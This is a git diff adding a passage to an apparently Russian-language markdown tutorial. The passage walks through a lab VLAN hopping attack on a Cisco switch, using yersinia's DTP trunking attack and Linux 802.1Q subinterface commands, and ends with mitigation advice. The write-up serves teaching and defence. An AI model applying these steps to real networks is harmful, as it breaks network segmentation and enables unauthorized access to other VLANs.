@@ -15,4 +15,30 @@ Negotiation of Trunking: On
 ```
 Изменить его (из интереса к кибербезопасности) можно командой Cisco в конфиге интерфейса: switchport mode dynamic desirable.
 Общая схема сети следующая:
-![alt text](http://url/to/img.png)
+![alt text](https://github.com/ki2dd1e/tech/blob/main/image.png)
+IP адрес злоумышленника: 1.1.1.2, VLAN ID 1.
+IP адрес жертвы: 2.2.2.2, VLAN ID 2.
+На данный момент интерфейсы настроены следующим образом:
+```
+Switch#show interfaces status
+
+Port      Name               Status       Vlan       Duplex  Speed Type
+Et0/0                        connected    1          a-full   auto RJ45
+Et0/1                        connected    1          a-full   auto RJ45
+Et0/2                        connected    2          a-full   auto RJ45
+...
+```
+На хосте злоумышленника запустим ПО yersinia (сломавшая не одну зависимость) и выберем DTP -> Launch attack -> enable trunking.
+В консоли коммутатора теперь видно, что интерфейс Eth0/1 изменен на Trunk:
+```
+Et0/1                        connected    trunk          a-full   auto RJ45
+```
+Остается добавить виртуальный интерфейс и назначить ему IP из VLAN 2:
+```
+modprobe 8021q
+vconfig add eth0 2
+ifconfig eth0.2 up
+ifconfig eth0.2 2.2.2.3 up
+```
+В результате, пинг от злоумышленника до хоста из VLAN 2 проходит успешно, и тем самым выполнена атака VLAN Hopping.
+Для устранения угроз необходимо вынести все неиспользуемые порты коммутатора в отдельный VLAN со специальным ID (номер которого тяжело выбрать случайно), а также отключить DTP.
